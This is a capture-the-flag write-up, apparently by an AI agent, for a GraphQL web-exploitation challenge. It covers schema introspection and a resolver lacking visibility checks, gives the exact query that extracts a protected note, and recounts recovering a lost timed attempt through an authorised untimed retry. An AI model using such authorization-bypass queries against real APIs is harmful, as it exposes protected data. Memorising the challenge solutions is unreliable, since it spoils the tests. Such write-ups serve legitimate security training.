Prompt

"Discover the schema and reach a resolver whose field-level control is incomplete. Vary the protocol surface without changing the underlying authorization discipline."

Single and Time Trial - one target (Graph Garden)

Target returns /api/clues with {current_user, feature_route, protected_reference}. feature_route (e.g. /inspect-46c9c6) is the GraphQL endpoint; it refuses GET /graphql but accepts POST at the hashed path.

Schema (via introspection):

type Query { caseIndex: [CaseReference]; case(id: ID): Case }
type CaseReference { id, title, visibility }   # visibility includes "reference only"
type Case { id, title, note }                  # note is the proof

caseIndex labels one id as "reference only", but the case(id) resolver has NO visibility check: it returns the note for that id anyway. Query:

POST /<feature_route>  Content-Type: application/json
{"query":"{case(id:\"<protected_reference>\"){note}}"}

The note value is the proof_<hex> answer for proof-1.

Mastery - four targets, four protocol surfaces, same lesson (incomplete field-level/authorization boundary)

Target index → vulnerability class:

How Mastery was recovered after a lost ranked window

The hof_policy chose a ranked (run_for_time) Mastery attempt as soon as Single was CORRECT; proof-1 was accepted but the 135 s deadline passed before I had per-target extractors for the three non-GraphQL surfaces. One ranked variant was lost (7 of 8 remained).

User authorised using the untimed/practice path. With HUNTRESS_HOF=0 set in the environment, autosolve.py 25 web-exploitation-day-18-resolver-revolt web-exploitation chose op=retry without run_for_time, which opened a fresh UNTIMED Mastery attempt (deadline:null, ~30 min inactivity timer). I then enumerated each target off the clock, derived the three remaining proofs, and submitted them in one batch - CORRECT, no extra variants spent.

Lesson for the next team

"Vary the protocol surface" means literally four different stacks per Mastery attempt (static Node, cookie-session REST, SQL-backed search, GraphQL). A ranked attempt is only safe once per-shape extractors are banked; otherwise take the untimed path (the flag and CourseStack points both still land).
